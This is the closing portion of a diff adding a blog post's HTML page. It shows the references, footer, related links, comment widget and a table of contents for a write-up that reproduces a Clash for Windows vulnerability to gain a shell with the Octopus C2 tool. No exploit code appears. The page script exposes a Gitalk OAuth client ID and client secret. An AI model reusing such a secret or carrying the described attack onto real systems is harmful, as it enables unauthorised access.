+    >https://github.com/Fndroid/clash_for_windows_pkg/issues/2710</a></p>
+<p><a class="link" href="https://httpd.apache.org/docs/2.4/install.html"  target="_blank" rel="noopener"
+    >Compiling and Installing - Apache HTTP Server Version 2.4</a></p>
+<p><a class="link" href="https://github.com/mhaskar/Octopus/"  target="_blank" rel="noopener"
+    >GitHub - mhaskar/Octopus: Open source pre-operation C2 server based on python and powershell</a></p>
+<blockquote>
+<p>Part of translations by <strong>GPT-4</strong></p>
+</blockquote>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/exploit/">exploit</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/pwn-pwn-pang-part2---tool-usage/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwn-pwn-pang-part2---tool-usage/cover.dfc14371a1ebc11e7a4c671f0b6a9755_hu3d6209426f4a4882dd231c4242aff084_2839967_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN! PWN! PANG! Part2 --- Tool Usage"
+                        
+                        data-hash="md5-38FDcaHrwR56TGcfC2qXVQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN! PWN! PANG! Part2 --- Tool Usage</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/pwn-pwn-pang-part1---basic-knowledge/">
+        
+        
+            <div class="article-image">
+                <img src="/p/pwn-pwn-pang-part1---basic-knowledge/cover.781de6edaf36962e5b0cc87723920ee2_hu576b02bd11baef12c82f0e62b58bf2a0_136072_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PWN! PWN! PANG! Part1---Basic Knowledge"
+                        
+                        data-hash="md5-eB3m7a82li5bDMh3I5IO4g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PWN! PWN! PANG! Part1---Basic Knowledge</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div id="gitalk-container"></div>
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: "350f7151191770b41225",
+        clientSecret: "ddbff992a105766dc2834098a20c8e1e497b27c1",
+        repo: "kira-pgr.github.io",
+        owner: "Kira-Pgr",
+        admin: ["Kira-Pgr"],
+        distractionFreeMode: false, 
+        id: md5(location.pathname), 
+    });
+    (function () {
+        if (
+            ["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1
+        ) {
+            document.getElementById("gitalk-container").innerHTML =
+                "Gitalk comments not available by default when the website is previewed locally.";
+            return;
+        }
+        gitalk.render("gitalk-container");
+    })();
+</script>
+
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2022 - 
+        
+        2023 CSNek0&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        
+            For a better open source community! <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.13.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#disclaimer">Disclaimer</a></li>
+    <li><a href="#preparation">Preparation</a>
+      <ol>
+        <li><a href="#a-vulnerable-clash-windows-client">A Vulnerable Clash Windows Client</a></li>
+        <li><a href="#c2-tool-octopus">C2 Tool Octopus</a></li>
+        <li><a href="#apache2">Apache2</a></li>
+      </ol>
+    </li>
+    <li><a href="#vulnerability-reproduction">Vulnerability Reproduction</a>
+      <ol>
+        <li><a href="#linux-attacking-machine">Linux (Attacking Machine)</a></li>
+        <li><a href="#victim-machine">Victim Machine</a></li>
+        <li><a href="#successful-shell-acquisition">Successful Shell Acquisition</a></li>
+      </ol>
+    </li>
+    <li><a href="#patch">Patch</a></li>
+    <li><a href="#ref">Ref</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script src="/js/snow.js"></script>
+<script
+    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js"
+    integrity="sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe"
+    crossorigin="anonymous"
+    size="300"
+    alpha="0.6"
+    zindex="-1"
+    defer
+></script>
+
+    </body>
+</html>
